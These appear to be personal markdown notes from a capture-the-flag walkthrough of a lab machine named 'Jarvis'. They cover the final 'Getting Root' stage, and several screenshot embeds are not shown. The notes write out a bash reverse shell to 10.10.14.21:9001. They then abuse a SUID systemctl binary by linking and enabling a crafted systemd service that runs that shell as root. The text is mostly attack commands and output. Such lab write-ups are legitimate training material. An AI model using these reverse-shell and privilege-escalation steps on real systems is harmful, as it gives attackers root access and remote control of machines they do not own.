# Getting Root
![[Pasted image 20211203132459.png]]

```bash
cat  /var/www/Admin-Utilities/simpler.py
```
![[Pasted image 20211203132748.png]]


create a reverse shell script on shm
```bash
$ cat /dev/shm/shell.sh 
bash -i >& /dev/tcp/10.10.14.21/9001 0>&1
```

![[Pasted image 20211203132953.png]]

Pepper
![[Pasted image 20211203133015.png]]

![[Pasted image 20211203133637.png]]

# GTFOBins  https://gtfobins.github.io/
### systemctl SUID
![[Pasted image 20211203134436.png]]

Content's
```bash
root@jarvis:/home/pepper# cat shell.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.21/9001 0>&1
root@jarvis:/home/pepper# cat jojo.service 
[Unit]
Description=shell

[Service]
Type=oneshot
ExecStart=/home/pepper/shell.sh 

[Install]
WantedBy=multi-user.target
```

```bash
pepper@jarvis:~$ systemctl link /home/pepper/jojo.service    
Created symlink /etc/systemd/system/jojo.service -> /home/pepper/jojo.service.
pepper@jarvis:~$ systemctl enable --now /home/pepper/jojo.service
Created symlink /etc/systemd/system/multi-user.target.wants/jojo.service -> /home/pepper/jojo.service.

```



![[Pasted image 20211203144929.png]]